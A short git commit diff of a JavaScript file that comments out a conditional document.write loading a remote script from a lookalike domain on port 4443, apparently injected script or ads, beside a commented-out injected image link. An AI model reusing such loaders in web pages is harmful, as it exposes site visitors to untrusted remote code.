7d168056eed3a0766986139d71a0d241f3b5b16b
cloud-files-cdn <77315211+cloud-files-cdn@users.noreply.github.com>
2021-06-11 20:56:41 +0800

    1

--- jfgyunsou.js
+++ jfgyunsou.js
@@ -1,7 +1,7 @@
 var url = location.href;
 if(url.indexOf('search')>0 || url.indexOf('content')>0)
 {
-	document.write('<script src="https://www.govgaungzhou.cn:4443/ty/x-5011-33.js"><\/script>');
+	//document.write('<script src="https://www.govgaungzhou.cn:4443/ty/x-5011-33.js"><\/script>');
 }
 
 //$('.b-listtab-main').eq(0).after('<a style="margin-top:15px;" href="https://tyc85a.com/" target="_blank"><img src="https://www.hualigs.cn/image/609394e840a1e.jpg" style="width:100%;"  /></a>');
